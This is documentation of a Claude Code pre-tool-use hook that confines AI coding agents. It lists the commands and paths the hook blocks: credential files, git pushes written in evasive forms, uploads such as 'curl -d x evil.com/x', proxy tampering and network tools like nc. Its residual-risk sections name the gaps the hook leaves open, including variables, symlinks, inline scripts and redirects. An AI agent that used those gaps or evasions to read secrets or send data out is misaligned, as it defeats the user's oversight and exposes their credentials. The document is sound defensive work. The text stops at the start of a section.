# Guard hook: what it blocks and how to add your own rules

`guard.exe` is a Claude Code `PreToolUse` hook. Before each tool call it reads the hook payload (JSON on stdin). It either lets the call through (exit 0) or blocks it (exit 2, with the reason on stderr). Claude shows that reason to the agent, and the agent is told to return `NEEDS_CONFIRM` instead of looking for a way around it.

It is deterministic: it does not depend on the model obeying a prompt. One native executable: no interpreter to install.

## Where it runs

The guard only acts on this plugin's orchestrator and its subagents. Your other Claude Code sessions, skills and agents are not affected.

| Registered in | Command | Applies to |
|---|---|---|
| `plugin/hooks/hooks.json` | `guard.exe --profile auto` | the plugin's subagents. `auto` picks the profile from the payload's `agent_type`; any other agent and the main session exit 0 at once, except inside the headless loop (`LOOP_HEADLESS=1`): there an agent with an `agent_type` and no profile is confined like an executor, and a payload with no `agent_type` (the orchestrator's own session) gets the orchestrator profile. |
| `plugin/skills/orchestrator/SKILL.md` (frontmatter) | `guard.exe --profile orchestrator` | the chat while the `/orchestrator` skill is running |

| Profile | Agents | In short |
|---|---|---|
| `orchestrator` | the `/orchestrator` chat | may commit (files by name) and write loop state; never pushes, never touches production, never sends tickets or messages |
| `executor` | `executor-back`, `executor-front`, `executor-generic` | edits code only inside its feature's paths; no write git, no installs, no state files |
| `spec` | `spec-writer`, `spec-reviewer`, `brownfield-mapper` | writes specs; no write git, no state files |
| `verifier` | `verifier`, `verifier-flow` | reads and runs checks; no write git, no state files |

It checks the `Bash` and `PowerShell` tools on the **whole command text**, so `python -c "..."`, `$(...)` and quoted commands are covered. It also checks shell writes (`>`, `>>`, `tee`, `sed -i`, `Set-Content`, `Add-Content`, `Out-File`), `Write`/`Edit`/`NotebookEdit` paths, `Read`/`Glob`/`Grep` inputs for credentials, and `mcp__*` tool names.

## Built-in rules

From `PROFILES` and `HARD` in the guard (`crates/guard-core/src/rules.rs`). O = orchestrator, E = executor, S = spec, V = verifier.

| Rule | Blocks | Profiles | Hard |
|---|---|---|---|
| `git-push` | any `git push`, wherever it sits in the command and however git's global options are written: `git -C "a b" push`, `git -c k=v push`, `git --git-dir=... push`, a backslash-newline between `git` and `push`, `-c alias.p=push p` (any `-c alias.*=push` or `!` alias, and `git config alias.* push`), after `VAR=x`, `env`, `command`, `sudo`, in `( ... )`, `$(...)` or backticks, inside `bash -c "..."`, `python -c` or a `["git", "push"]` list (see "How a command is read") | O E S V | |
| `push-protected` | a push naming `developer`, `develop`, `main`, `master`, `release`, `production`, `dev` or your integration branch (`LOOP_INTEGRATION_BRANCH` / `LOOP_PR_BASE`) in any refspec (`HEAD:refs/heads/main`), `--mirror`, `--all`, or a bare `git push` (also `git push origin HEAD`) while on one of them | every push, any profile | **yes** |
| `push-force` | `--force`, `--force-with-lease[=...]`, `-f`, any short-flag cluster with an `f` (`-uf`, `-fu`), `+refspec` | every push, any profile | **yes** |
| `approval-write` | writing `ROADMAP-APPROVED.json` (only your click in the panel writes it), in any spelling of its path (see "Path spellings") | O E S V | **yes** |
| `engine-file-write` | writing a file the engine or the app owns: `.specs/project/loop/**/LOOP-CMD.json` (the command the panel relaunches on Resume) `.specs/project/NETWORK.json` (the project network list, edited by the user in the panel), `.specs/project/loop/internal/network-*` (files of the run-time egress layer) and `.specs/project/REPOS.json` (the repo list: the planning chat proposes repos in `REPOS-SUGGESTED.json`, the app validates and applies them). Also a Windows 8.3 short name (`CLAUDE~1.JSO`) that cannot be expanded when it sits under `.specs/`, the home folder or `~/.claude/` | every profile (O E S V and planning) | **yes** |
| `panel-trigger` | calling the panel endpoints that need your click (start or check the loop, approve the roadmap, act, answer, resume, instruct): with or without the scheme (`localhost:8765/p/x/api/loop/start`, `127.0.0.1:...`, `[::1]:...`), with the URL split by quotes or `+` (`"http://localhost:8765""/p/x/api/loop/start"`), through curl, `iwr`/`irm`, wget or `python urllib` | O E S V | **yes** |
| `pr-release` | `gh pr`, `release`, `repo`, `gist`, `workflow` other than `view`, `list`, `diff`, `status`, `checks`; also `gh issue`/`label`/`secret`/`variable`/`ruleset`/`run`/`project`/`cache`/`codespace`/`ssh-key`/`gpg-key`/`extension` other than those read verbs, and `gh api` that writes (`-X`/`--method` other than GET, or any `-f`/`-F`/`--field`/`--raw-field`/`--input`, which make gh POST). Seen with leading flags (`gh -R o/r pr create`), as `gh.exe` or by full path | O E S V | |
| `prod-write` | write SQL through a database MCP tool of a server flagged `production` in `config.json` `mcp_servers` or whose name contains a hint (`GUARD_PROD_HINTS`, default `prod,production`), or any write-verb MCP tool on such a server | O E S V | |
| `outbound-msg` | ticket, issue, chat, mail or comment MCP tools with a create, update, send or post verb | O E S V | |
| `secrets` | reading, writing or running anything on `.secrets/`, a `.env` anywhere under a `shared`/`_shared` folder, `~/.loop-harness/.env` or `app.json`, every file in `~/.ssh/` and `~/.aws/`, `~/.npmrc`, `~/.netrc`, `~/.git-credentials`, `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.kube/config` (a `*.example` template stays readable), your own `~/.claude.json` and `~/.claude/.credentials.json` (any spelling: `~`, `$HOME`, `%USERPROFILE%`, `$env:USERPROFILE`, backslashes, git-bash `/c/...`; a `.claude.json` in another folder is not a hit), anything listed in `GUARD_SECRET_PATHS` (see "Your extra secret paths"), a glob that expands to one of the two Claude files (`cat ~/.claude/.cred*`, `Get-Content ~/.claude/*.json`), a recursive read of `~/.claude` or the home folder (`grep -r`, `rg --hidden`, `Get-ChildItem -Recurse | Select-String`, `find -exec cat`), and a `Grep`/`Glob` call whose folder is `~/.claude` (or holds it) and whose `glob`/`type`/pattern can hit them (`Grep path=~/.claude`, `Glob .cred*`, `Glob **/*`); a search of `~/.claude/skills/**` is not affected, or a config file copied into a worktree (`copied` in `SCOPE.json`, from REPOS.json `copy`), by name or by a recursive/ignore-bypassing search that would reach it (see "Copied config files") | O E S V | |
| `project-deny` | **your** `deny_bash_regex` and `deny_path_regex` (see the cookbook) | O E S V | |
| `git-add-all` | `git add .`, `git add -A`/`--all`, `git commit -a` | O | |
| `git-write` | any git subcommand except `status`, `diff`, `log`, `show`, `rev-parse`, `ls-files`, `blame`, `describe`, `grep`, `shortlog`, found anywhere in the command (`x=$(git reset --hard)`, `GIT_EDITOR=true git commit`, `command git commit`, `sudo git ...`, inside `( ... )` or `bash -c "..."`), global options skipped (`git -C x status` is a read). A `-c` key that makes git run a program (`core.fsmonitor`, `core.pager`, `core.sshCommand`, `credential.helper`...) is not a read | E S V | |
| `dev-write` | write SQL through a database MCP tool that is not production (a server of type `sql` that is not flagged, or a tool name with a database word) | E S V | |
| `state-write` | writing `ROADMAP.md`, `FLOWS.md`, `STATE.md`, `RULES.md`, `phases/`, `archive/`, `REPOS.json` or anything under `.specs/project/loop/`, in any spelling of the path (see "Path spellings"), also as the destination of `cp`/`mv` or the path of a delete | E S V | |
| `state-script` | `harness rules write`, `audit --write/--apply`, `graph --write`, `state loop`/`migrate` | E S V | |
| `delivery` | `harness deliver` / `harness deliver` | E S V | |
| `loop-run` | `harness loop`/`check`/`serve`, `harness loop` | E S V | |
| `install` | `npm`/`pnpm`/`yarn`/`bun` `install`/`add`/`ci`/`update`, `dotnet restore`/`add package`, `pip install` | E | |
| `path-scope` | `Write`/`Edit` (and a shell redirect, `tee`, `Set-Content`, `Out-File`, `sed -i`) outside the feature's paths in `.specs/project/loop/json/SCOPE.json` (absolute entries, or relative to the primary root); `NotebookEdit` (`notebook_path`) is judged like `Write`/`Edit`. A redirect is judged with every stream prefix (`>`, `>>`, `>|`, `1>`, `2>`, `2>>`, `&>`, `&>>`, `*>`), a delete also when it is `\rm`, `/usr/bin/rm`, `C:\...\rm.exe`, `command rm`, `sudo rm`, after a pipe or a single `&` | E | |
| `mcp-allowlist` | any `mcp__*` tool, only in an isolated or headless loop session (`LOOP_HEADLESS=1` or `LOOP_ISOLATED=1`), of a server the user did not allow in the app's Settings > MCP servers (`config.json` `mcp_servers`: `allow`, `kind` `sql`/`other`, `production`, `read_only`; `mcp_allow_extra`: extra `mcp__server__tool*` patterns). **Closed by default**: nothing configured = no MCP tool. A `production` server only for `orchestrator` and `planning`; a `read_only` server only read tools (name starts with get, list, query, search, find...) and, for `sql`, no writing statement. Both spellings of a plugin server work (`plugin:<plugin>:<server>` = `mcp__plugin_<plugin>_<server>__`). A `config.json` that exists but cannot be read allows nothing. Not released by `PERMISSIONS.json` | loop sessions | **yes** |
| `grafana-write` | any `mcp__grafana__*` tool that is not a read: `create_*`, `update_*`, `delete_*`, `add_*`, `install_*`, `alerting_manage_*`, `create_snapshot`/`delete_snapshot`, and `grafana_api_request` with a method other than GET (reads such as `query_loki_*`, `list_*`, `get_*`, `search_*`, `find_*`, `check_*`, `generate_deeplink` stay allowed). No `PERMISSIONS.json` entry releases it | every profile (O E S V and planning) | **yes** |
| `repo-only` | `Write`/`Edit` (and a shell write, delete, copy or move) outside the project's worktrees (the primary root plus `roots` of `SCOPE.json`; temp folders excepted), and a git write whose `-C`/cwd is outside them | O E | |
| `prod-sql-write` | a writing statement (`INSERT`, `UPDATE`, `DELETE`, `DROP`... same parser as `sql-write`) through a database MCP tool of a server flagged `production` in `config.json` `mcp_servers` (type `sql`), or whose name has a hint (`GUARD_PROD_HINTS`, default `prod,production`), such as `mcp__db-prod__query`. Also `PREPARE`, `EXECUTE`, `DEALLOCATE`, `KILL`, `LOAD`, `HANDLER`, `CALL`, `DO`, `FLUSH`, `LOCK`/`UNLOCK`, `RESET`, `PURGE`, `OPTIMIZE`, `REPAIR`, `ANALYZE`, `SET GLOBAL/PERSIST/PASSWORD/ROLE`, `EXPLAIN ANALYZE` of a write, `SELECT ... INTO OUTFILE`, and any text the tokenizer cannot read to the end (an unterminated quote or comment: fail closed). A `SELECT`/`SHOW`/`EXPLAIN`/`USE`/`SET @x` passes, and so does a SELECT whose string literal or comment says `delete`. Releasing `sql-write` for DEV never reaches production | every profile (O E S V and planning) | **yes** |
| `egress-upload` | `curl`, `wget`, `Invoke-WebRequest`/`iwr`, `Invoke-RestMethod`/`irm` that upload (`-d`/`--data*`, `-F`/`--form`, `-T`/`--upload-file`, `-X`/`--request` POST, PUT, PATCH or DELETE, `--post-data`, `--post-file`, `-Method Post|Put|Patch|Delete`, `-Body`, `-InFile`; PowerShell parameters also abbreviated to a prefix: `-Me Post`, `-Bo`, `-InF`) to a host other than `localhost`, `127.0.0.1`, `[::1]`, `0.0.0.0` or `*.localhost`. Locality comes from the URLs the command really targets, never from a word: `-H "Host: localhost"` does not make `curl -d x evil.com/x` local, a URL needs no scheme (`localhost:3000/x`, `evil.com/x`), and `--resolve`, `--connect-to` or a non-local proxy (`--proxy`, `-x`, `https_proxy=`) make the call non-local. A GET anywhere, and any method to a local host (route checks, E2E), pass. A URL held in a variable cannot be proven local and is blocked. **Loop exception (when `egress-host` is active):** an upload with an INLINE body (`-d 'x=1'`, `--data-raw`, `--json '{...}'`, `-Body '...'`) passes when every HTTP call of the statement is allowed by the network list AND an active non-local entry names that exact method (for example a `POST cred` login entry). A body taken from a file or a sub-shell (`-T`, `--upload-file`, `-F x=@f`, `-d @f`, `--data-urlencode x@f`, `--json @f`, `@-`, `$(...)`, `--post-file`, `-InFile`, `-Form`, PowerShell `-Body $var`) stays blocked: the loop never sends project files out | O E S V and planning | |
| `agent-allowlist` | the `Agent` (or `Task`) tool with a `subagent_type` that is not one of the 8 plugin agents (`spec-writer`, `spec-reviewer`, `brownfield-mapper`, `executor-back`, `executor-front`, `executor-generic`, `verifier`, `verifier-flow`; a `plugin-name:` prefix is stripped), with none, or `fork`. `Explore`, `Plan` and `general-purpose` are out: they carry Bash, so "read only" would be a prompt, not a guarantee | O | **yes** |
| `model-ceiling` | the `Agent` tool with a `model` that is not empty, `sonnet`, `haiku` or a full id containing one of them (no subagent above Sonnet, see RULES.md) | O | **yes** |
| `scope-unreadable` | an executor `Write`/`Edit` or confined shell write while `SCOPE.json` exists but is not valid JSON, not an object, or has a shape the guard cannot enforce (`features` or `tasks` not an object of lists of strings, a feature with `null` or non-list PATHS, `roots`/`copied` not a list of strings). Fail closed, the one deliberate exception to "Fail-open": a broken file must not widen every feature to the whole repo. It also writes a `guard-failopen` line to `guard.log` and sends the once-an-hour notice. No `SCOPE.json` at all keeps today's behaviour (no `path-scope`, only `repo-only`) | E | |
| `egress-host` | **loop sessions only** (`LOOP_HEADLESS=1` or `LOOP_ISOLATED=1`, the switch of `mcp-allowlist`; an interactive session is never limited). Every request the command makes must match the project's network list (besides curl/wget/iwr/irm and the browser, the tools `nc`, `ncat`, `telnet`, `ftp`, `ssh`, `scp`, `sftp`, `nslookup`, `dig`, `Test-NetConnection` are judged as `tcp` requests of their `host:port` (an entry `host:port tcp`; DNS names count as port 53) and `Start-BitsTransfer`, `certutil`, `bitsadmin` as GET requests of the URL they name): `.specs/project/NETWORK.json` + `egress_hosts` / `egress_never` / `egress_builtin_read` of `<data dir>/config.json` + the always-local hosts and the built-in read list (GET/HEAD, never credentials). An entry is `host[:port][/path-prefix] [METHODS] [cred] [if-missing=NAME]`; the guard's copy of the grammar and of the matching is the guard's `net` module, pinned to the app's by the network contract fixture (`crates/*/tests/fixtures/network_contract.json`). Judged: `curl`/`wget`/`iwr`/`irm` (method from `-X`/`-d`/`-I`/`-G`/`-Method`/`-Body`..., default GET), `playwright-cli open\|goto\|tab-new` (GET), URL literals (`http(s)://`, `ws(s)://`) inside `python -c`, a heredoc or stdin body, `node -e/--eval/-p`, `deno eval`, `pwsh -c`/`-EncodedCommand`, and inside the script FILE a command runs (`python script.py`, `node x.js`, `npx tsx x.ts`, `deno run x.ts`, `pwsh x.ps1`, `bash x.sh`, `./x.sh`, `source x.sh`; inside the project or a temp folder, at most 1 MB, vendored folders such as `node_modules` skipped; a script written by the same command is judged from the command text): the method of a literal cannot be known, so it passes when host and path match ANY entry; the inner command of `craft testenv exec '<inner>'`, with every secret-named `$NAME` (the toolkit's `SECRET_NAME`) counting as a credential. A credential (`Authorization`/`Cookie`/`X-Api-Key`/`X-*-Token` header, `-u`/`--user`, `-b`, URL userinfo, `-Credential`, a secret `$NAME`) needs an entry with `cred`. A target held in a variable is expanded only for names ending `_URL`, `_HOST` or `_BASE` defined in the project's `.specs/project/.env.test` (read by the guard, never printed); a variable port, a query or a path part after the literal prefix does not matter; any other variable, a sub-shell, `--resolve`/`--connect-to`/a non-local proxy, or a command with no target is not provable and blocked. A broken `NETWORK.json` or `config.json` blocks every non-local request. The block names host, path and method: `GET dev.example.com/backplan is not in this project's network list (.specs/project/NETWORK.json; ask the user to add it in the Test environment tab)`. Every allowed request writes an `allow` line (`GET dev.example.com/catalog/items`) to `guard.log`. Text only mentioned by `echo`/`grep`/`rg`... is not a command. Residual: `curl -L` redirects (only the first URL is judged), package managers, a script that builds its URL at run time (the run-time egress layer catches that by host) | O E S V and planning, roadmapmap, subprojects, systemmap | **yes** |
| `egress-content` | loop sessions only. A `Write`/`Edit`/`MultiEdit`/`NotebookEdit` of a code, script, config or `.env` file inside the project (or a temp folder) that puts a URL literal (`http(s)://`, `ws(s)://`, `KEY=https://...`) in it that is not on the network list (any method). Not scanned: documents and binaries (`.md`, `.txt`, images, archives), lock files, `.specs/`, content over 1 MB (a note goes to `guard.log`), URLs whose host is a template or placeholder (`https://${HOST}/x`), and XML/JSON-schema namespace identifiers that are never fetched (`www.w3.org`, `schemas.microsoft.com`, `json.schemastore.org`, ...) | same profiles as `egress-host` | **yes** |
| `egress-tamper` | loop sessions only. Anything that would switch the run-time egress layer off: assigning, clearing or unsetting `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `FTP_PROXY`, `NODE_USE_ENV_PROXY`, `LOOP_NETWORK_ALLOW_FILE` (any case; `export`, `VAR=x cmd`, `set`, `setx`, `$env:X =`, `Remove-Item Env:X`, `Set-Item`, `[Environment]::SetEnvironmentVariable`, `unset`, `env -u`, `export -n`); `env -i`; the same for `PYTHONPATH` and `NODE_OPTIONS`, except an append that keeps the old value first (`PYTHONPATH=$PYTHONPATH:src`, `$env:NODE_OPTIONS += ' --x'`); `curl --noproxy`/`-x`/`--proxy`/`--socks*`, `wget --no-proxy`/`-e ...proxy...`, `-NoProxy`; `python -S`/`-E`/`-I`; `node --no-experimental-*`; inline code that touches those variables; `[System.Net.WebRequest]::DefaultWebProxy =` and `[System.Net.Http.HttpClient]::DefaultProxy =` (also `[Net.WebRequest]`); an `.env` file written with a proxy variable; and the browser filter: `playwright-cli route`, `unroute`, `route-remove`, and any `run-code` text (inline or a file) with `unroute`, `.route(`, `routeFromHAR` (`run-code --filename=<project>/.specs/project/loop/internal/network-filter.js`, the file the engine writes, is the one allowed form) | same profiles as `egress-host` | **yes** |
| `env-file` | loop sessions only (outside the loop the `secrets` rule stays as it is). A `.env` / `.env.<x>` file (not `.env.example`, `.sample`, `.template`) INSIDE the project root (the worktree or the repo, subprojects included) may be read, created and edited, EXCEPT `.specs/project/.env.test` (its values reach commands only through `craft testenv exec`); one OUTSIDE the project root (the app data folder, shared folders, other repos, the home folder) is blocked for `Read`/`Grep`/`Glob`/`Write`/`Edit` and in the text of a Bash/PowerShell command; a path built from a variable cannot be placed and is blocked | same profiles as `egress-host` | **yes** |

**Hard** rules cannot be lifted by `PERMISSIONS.json`. Every block and every rule you lifted is logged in `.specs/project/loop/internal/guard.log`.

In the headless loop there is a second lock. `claude -p` runs with the `pushurl` of every remote set to an invalid URL (`GIT_CONFIG_*`), so a push fails even if a regex misses it.

## Copied config files: what the `secrets` rule covers and what it does not

A config file copied into a worktree (`copied` in `SCOPE.json`, e.g. `.env.local`) is git-ignored, and the guard keeps agents from reading it. Checked with ripgrep 14.1.1 in a throwaway git repo whose `.gitignore` lists `.env.local`: `rg SECRET` (what the Grep tool runs) **skips** it, and so does `rg --hidden`; `rg --no-ignore` alone still skips it (it is also a hidden file, and that flag does not unhide), but `rg --no-ignore --hidden` and `rg -uu` **read it**; `rg -g '.env*'` **reads it** (a glob whitelists an ignored file, and the Grep tool's `glob` parameter does the same); `grep -r` reads it; the Glob tool **lists** it (names only, it does not honour `.gitignore`). So what is blocked, with the `secrets` rule, when the target folder is or contains the folder of a copied file:

- by name: any tool call or command that names the file (full path in any spelling that normalizes to it, or its path inside the worktree when the cwd is that worktree);
- Bash/PowerShell: `rg`/`ag`/`ack` with `--no-ignore*`, `-u`/`-uu`, `--unrestricted`, or a `-g/--glob` that singles the file out; `grep -r/-R/--recursive` (unless `--include` excludes it or `--exclude` names it); `git grep --no-index`/`--no-exclude-standard`; `find` feeding `-exec`/`xargs` to a reader (unless every `-name` excludes it); `Get-ChildItem -Recurse` (or `gci -r`, `ls -R`) piped to `Select-String`/`Get-Content`/`cat`/`type`...; `findstr /s`; recursive copy or archive (`cp -r`, `Copy-Item -Recurse`, `xcopy /s`, `robocopy`, `rsync`, `zip`, `tar -c`), which would move the secret to a name the guard does not know; a glob that singles the name out (`cat .env*`, `type *.local`) and, for `Select-String`/`Get-Content`/`findstr`, a bare `*` in that folder;
- Grep tool: a `glob` that singles the file out, or an ignore-bypass parameter; Glob tool: a pattern that singles the file out (`.env*`, `*.local`; a bare `*` or `**/*.ts` is fine).

A normal source search keeps working: `Grep` without a glob, `rg pattern`, `grep -r pattern src/`, `find . -name '*.ts' -exec grep ...`, builds and tests (a build that loads the file is not a tool call on it).

Residual risk, on purpose and not closed: the check is text analysis, not a sandbox. A target that comes from a variable or sub-shell (`$(...)`, `$env:X`), a script or program that opens the file itself (`python -c`, `node -e`, a test that prints `process.env`), a wildcard such as `cat *` in bash (the shell does not expand it to dotfiles, so it is not flagged), commands this list does not know, and any path that reaches the file through a symlink or junction are not seen. The file is also readable by the build and test tools the executor is allowed to run. The real protection is that these files hold development values only: never copy a production secret into a worktree.

## Locating `.specs/`, path normalization and the temp exemption

- **`LOOP_SPECS_DIR`.** `SCOPE.json`, `PERMISSIONS.json` and `guard.log` live only in the PRIMARY worktree's `.specs/`. A hook whose cwd is another worktree (after a `cd`, or with `--add-dir`) finds no `.specs/` walking up, which would turn path-scope, repo-only and the copied-secrets rules off. The engine therefore exports `LOOP_SPECS_DIR` (absolute path of the primary `.specs` folder) in the `claude -p` environment and the hooks inherit it. When set, it wins over the walk-up; it is honoured only when it is absolute, an existing folder and named `.specs` (anything else is ignored). Without it the old walk-up from the payload `cwd` is unchanged (the app's planning/map jobs rely on that). The project root is always `dirname(specs_dir)`; a relative tool target (`apps/z/a.ts`) is resolved against the hook's cwd, never against the specs root, and then judged against the roots and PATHS.
- **Normalized comparison of copied secrets.** Every path-looking token of the command or tool input is normalized before it is compared with the `copied` absolute paths: backslashes and `//` collapsed, `.` and `..` resolved, a relative path resolved against the hook cwd, git-bash `/c/...` and WSL `/mnt/c/...` turned into `c:/...` (Windows), case-insensitive. A token that lands inside any listed worktree root with the same tail as a copied file (`.env.local` in the primary root, for instance) counts too. So `R://wt/.env.local`, `R:/wt/./.env.local`, `R:/wt/apps/../.env.local`, `../wt/.env.local` and `/r/wt/.env.local` are all blocked. The old substring match stays as a second net.
- **Path spellings.** `normalize_path` is the ONE canonical form every path rule compares (protected files `ROADMAP-APPROVED.json`, `PERMISSIONS.json`, `STATE.md`/`loop/`, `REPOS.json`, `LOOP-CMD.json`; the credential files; scope; copied secrets). On top of the rules above it undoes the Windows spellings: `\\?\` and `\\.\` prefixes (`\\?\UNC\...` too), the admin share of this machine (`\\localhost\C$\...`, `\\127.0.0.1\C$\...`, `\\[::1]\C$\...`, `\\<this computer>\C$\...` become `C:\...`), NTFS alternate data streams (`file::$DATA`, `file:stream`), trailing dots and spaces per component (`file.json.`, `file.json `), `/cygdrive/c/...`, and 8.3 short names (`CLAUDE~1.JSO`, expanded with `GetLongPathName` / `realpath` when the file exists). A short name that cannot be expanded and sits under `.specs/`, the home folder or `~/.claude/` is refused (`engine-file-write`), because it may be a protected file under another spelling. A tool path and a shell target are matched in both forms (as written, canonical), and a delete, copy/move destination or create is matched too, not only `>`/`tee`/`Set-Content`. Not covered: a symlink or junction that leads into a protected folder.
- **Temp exemption.** Writes to a temp folder (a `tmp`, `temp` or `scratchpad` path segment) outside the project's roots are allowed, except when any ancestor folder of the target holds a `.git` entry (folder or file, so linked worktrees count): a path inside a git working tree is code and is never exempt, wherever that repo lives. Genuine temp files (no `.git` above) keep the exemption.
- **Case.** Paths are lowercased for comparison only where the filesystem is case-insensitive (Windows, macOS: the `CASE_INSENSITIVE` flag of `guard.exe`). On a case-sensitive filesystem the original case is kept end to end, so the `.git` ancestor check (an `os.path.exists` on the real path, resolved against the hook cwd) and every other filesystem lookup hit the real file; glob/name matching and the build-output folder names are folded the same way.

## Your extra secret paths

The guard always protects your Claude login (`~/.claude.json`, which also holds the MCP server definitions, and `~/.claude/.credentials.json`) and the other home credentials listed in the `secrets` row (`~/.ssh/`, `~/.aws/`, `~/.npmrc`, `~/.netrc`, `~/.git-credentials`, gh `hosts.yml`, `~/.docker/config.json`, `~/.kube/config`); a symlink to a protected file is judged by its real target too. If you keep other credentials that an agent must never read, list them in `GUARD_SECRET_PATHS`: comma-separated files or folders (a folder covers everything under it), `~`, `$HOME` and `%VAR%` expanded, empty items ignored, a path that does not exist yet still counts. Put it in the environment, or in the app `.env` (`<LOOP_DATA_DIR or ~/.loop-harness>/.env`, read by the guard itself); the environment wins when both are set. Unset or empty means only the built-in list. Example:

```
GUARD_SECRET_PATHS=~/tools/my-wrapper/tokens,~/.config/some-cli/credentials.json
```

Matching is by the full normalized path, never by file name, so a project file called `.claude.json` in another folder is not blocked. The block uses the `secrets` rule, so the usual spellings (relative, `..`, `%USERPROFILE%`, git-bash `/c/...`) are covered. This is the Maestro's only knob for third-party credential folders: it names no wrapper or tool on its own.

## Shell writes are confined like Write/Edit

`>`, `>>`, `tee`, `Set-Content`/`Add-Content`/`Out-File` (also with `-Path`/`-FilePath`/`-LiteralPath`) and `sed -i` get the same confinement as `Write`/`Edit`, per statement (a `cd` before them is followed): an executor (`path-scope`) writes only inside the feature's PATHS, the orchestrator and the executor (`repo-only`) only inside the worktrees, spec and planning (`specs-only`) only inside `.specs/` (and `docs/codebase/` for spec). Exempt: temp folders, `/dev/*`, `nul`, `$null`, and build output folders inside a worktree (`bin`, `obj`, `node_modules`, `.pytest_cache`, `__pycache__`, `dist`, `coverage`, `.next`, `.venv`...). The tools' own writes (`dotnet build` filling `bin/obj`, `pytest` filling `.pytest_cache`) never go through the shell, so they are not seen at all. A `>` inside a quoted string (`python -c "print('a > b')"`) is text, not a redirect.

The same check also judges file commands, per statement, with the same exemptions (temp folders, build output folders inside a worktree, `/dev/*`) and no new rule id (the hit comes out as `path-scope`, `repo-only` or `specs-only`, and names the target):

- delete: `rm`, `rmdir`, `del`, `erase`, `rd`, `Remove-Item`, `ri`: every target (`-Path`/`-LiteralPath` values included; one target outside blocks the whole command);
- copy and move: `cp`, `mv`, `copy`, `move`, `xcopy`, `robocopy`, `Copy-Item`/`cpi`, `Move-Item`/`mi`: the DESTINATION (`-Destination`, `-t`/`--target-directory`, else the last positional; `robocopy`, the second);
- create: `New-Item`/`ni`, `mkdir`/`md`: the `-Path` value or every positional.

Residual risks, on purpose and not closed (text analysis is not a sandbox): a target built from a variable or sub-shell (`$x`, `$env:X`, `%X%`, `$(...)`, backticks) is not judged; a script or program that opens the file itself (`python -c`, `node -e`, a test); a command this list does not know (`dd`, `git clean`, `find -delete`, `Rename-Item`, `tar -x`); the source of a copy (only the destination is judged, and a read of a normal file is not a leak); and a path that reaches a protected place through a symlink or junction. Credentials copied into a variable first (`$t = gc ~/.claude.json`) are caught only on the line that names the file. The one lock that does not depend on a regex is on the database: give the database user of your production server (the one flagged `production` in Settings > MCP servers) a `SELECT`-only grant (done in MySQL, by you, not in this repository). `prod-sql-write` is then the second line, not the only one. The next step for real containment is a container or a separate OS user with no route to the credential folders and a network firewall (recorded in `docs/codebase/CONCERNS.md`).

## How a command, a SQL text and an upload are read

`guard.exe` is the hook (`guard.exe --profile x`, one native executable, runnable from any cwd, nothing to install next to it). The analysis lives in the modules of the `guard-core` crate:

| Module | What it reads |
|---|---|
| `shell` | the shell lexer (`shell_events`: quotes, backslash/backtick line continuation, `&&` `\|\|` `;` `\|` `&`, `(` `)`, `$(`, backticks, redirections; a quoted word with spaces is lexed again, so `bash -c "cd x && git push"` is seen) and the finders `git_calls_in` / `gh_calls_in`. A program is found at the start of a command (after `VAR=x`) and, after a wrapper word (`env`, `command`, `sudo`, `time`, `xargs`, `bash`, `cmd`, `&`, `if`/`then`/`do`...), anywhere later. Git's global options (`-C <path>`, `-c k=v`, `--git-dir`, `--work-tree`, `--no-pager`...) are skipped generically; `-c alias.x=push`, `alias.x=!...` and `git config alias.x push` count as a push; `GIT_DIR=` / `GIT_WORK_TREE=` before the command count for `repo-only`; a `cd` is followed and scoped to its `( ... )` |
| `sql` | one left-to-right tokenizer for quotes (`'`, `"`, `` ` ``, doubled quote, backslash escape) and comments (`-- `, `#`, `/* */`, with `/*! ... */` as code). The text is read under each server mode that changes where a literal or comment ends (`NO_BACKSLASH_ESCAPES`, `--` without a space) and a write found under any of them counts; whatever follows a comment is also looked at as a statement of its own when it starts like an unmistakable write. An unterminated quote or comment fails closed |
| `paths` | the Windows spelling helpers behind `normalize_path` (see "Path spellings") |
| `egress` | `curl`/`wget`/`iwr`/`irm` uploads and where they go (see `egress-upload`) |
| `mcp-policy` crate | the MCP policy: the grammar of `mcp_servers` / `mcp_allow_extra` in `config.json` (`<LOOP_DATA_DIR or ~/.loop-harness>/config.json`, read as utf-8-sig, fail closed when broken), name normalisation (`mcp__<server>__`, `plugin:a:b` -> `plugin_a_b`) and the allow / production / read-only decisions. The app loads this same crate for the Settings API, `claude -p` and `doctor` |
| `net` | the network list of the loop: the entry grammar and the matching (a copy of the app's and the toolkit's, see `egress-host`), the requests a command makes, URL literals in code and script files, `.env` files, tamper (`egress-host`, `egress-content`, `egress-tamper`, `env-file`) |

A crash before the checks run exits non-zero without blocking (Claude Code treats that as a hook error, not a deny).

## Decisions worth knowing

- **`REPOS.json`.** The app (Workspace, repo registry) and the engine write it, never an agent: the planning chat writes `REPOS-SUGGESTED.json`, which the server validates and applies (`references/planning.md`, `references/state.md`). So it is protected for every profile, planning included (`engine-file-write`, hard), and it is also in `state-write`. `REPOS-SUGGESTED.json` stays writable by planning. A hook cannot tell which key of the file an edit changes, which is why there is no "planning may write everything but `setup`".
- **`LOOP-CMD.json`.** The loop engine writes it on every run (it holds the argv the panel executes on Resume), so it is protected for every profile (`engine-file-write`, hard): an agent that could edit it would choose what the panel runs next.

- **`NETWORK.json`.** The project's network list is the user's decision (the Network section of the panel writes it to the repo): protected for every profile (`engine-file-write`, hard), and so are the run-time layer's files `loop/internal/network-*`. The planning chat may only SUGGEST hosts, in `NETWORK.suggested.json`; that file is writable by the `planning` profile and by no other, and only the user's click applies it. The four network rules are hard and not part of `PROFILES`: they are added to every profile at run time and act only in a loop session.
- **What the network rules do not see.** A redirect followed by `curl -L`, package managers (`npm install`, `pip install`, `git fetch`), a library that builds its URL at run time or reads it from a file (the guard reads text: the run-time egress layer enforces the host of whatever really connects), and `.env` files named by a glob or a variable the guard cannot resolve.

## Run-time egress layer: what the guard adds to an allowed command

The text rules above judge what a command says; the engine's run-time layer (the engine's egress proxy and the preloads in `engine/net_preload/`) judges what the processes really connect to, by host. The guard is the only thing that hands it to the agent's commands, and only in loop sessions (`LOOP_HEADLESS=1` or `LOOP_ISOLATED=1`):

